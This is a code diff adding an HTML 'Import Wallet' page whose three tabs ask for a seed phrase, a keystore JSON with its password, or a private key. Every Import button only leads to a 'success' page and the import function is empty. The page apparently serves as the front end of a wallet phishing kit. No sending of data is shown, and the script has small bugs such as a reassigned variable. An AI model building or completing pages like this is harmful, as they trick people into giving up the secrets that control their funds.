@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="style1.css">
+    <link href="https://fonts.googleapis.com/css?family=poppins&display=swap">
+    <link rel="stylesheet" href="https://unpkg.com/swiper@8/swiper-bundle.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+<body>
+    <div class="tabs-swap">
+        <div class="btn-box">
+            <button id="btn1" onclick="openPhrase()">Phrase</button>
+            <button id="btn2" onclick="openJson()">Keystore JSON</button>
+            <button id="btn3" onclick="openPkey()">Private Key</button>
+            <button id="btn4" onclick="importWallet()"></button>
+        </div>
+
+    
+        <div class="content" id="content1">
+            
+            <textarea name="phrase" id="phrase" cols="80%" rows="8" placeholder="Phrase" required></textarea>
+            <p>Typically 12 (sometimes 24) words separated by a single spaces.</p>
+            <div class="home-btn btn--primary btn--block">
+                <a href="success.html" class="btns" type="submit" >Import</a>
+                
+            </div>            
+                       
+        </div>
+
+        <div class="content" id="content2">
+            
+            <textarea name="text" id="json" cols="80%" rows="8" placeholder="Keystore JSON" required></textarea>
+            <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+            <div class="home-btn btn--primary btn--block" >
+                <a href="success.html" class="btns" type="submit">Import</a>
+                
+            </div>          
+                        
+        </div>
+
+        <div class="content" id="content3">
+            <input type="text" name="keys" placeholder="Private key" required>            
+            <p>Typically 12 (sometimes 24) words separated by a single spaces.</p> 
+            <div class="home-btn btn--primary btn--block">
+                
+                <a href="success.html" class="btn4" type="submit" onclick="importWallet()" >Import</a>
+                
+            </div>  
+                  
+            
+                                   
+        </div>
+
+    </div>
+
+    <script>
+        var content1 = document.getElementById("content1");
+        var content2 = document.getElementById("content2");
+        var content3 = document.getElementById("content3");
+
+        var btn1 = document.getElementById("btn1");
+        var btn2 = document.getElementById("btn2");
+        var btn3 = document.getElementById("btn3");
+        var btn3 = document.getElementById("btn4");
+
+        function openPhrase(){
+            content1.style.transform = "translateX(0)";
+            content2.style.transform = "translateX(100%)";
+            content3.style.transform = "translateX(100%)";
+        }
+
+        function openJson(){
+            content1.style.transform = "translateX(100%)";
+            content2.style.transform = "translateX(0)";
+            content3.style.transform = "translateX(100%)";
+        }
+
+        function openPkey(){
+            content1.style.transform = "translateX(100%)";
+            content2.style.transform = "translateX(100%)";
+            content3.style.transform = "translateX(0)";
+        }
+
+        function importWallet(){
+
+        }
+
+    </script>
+    
+</body>
+</html>
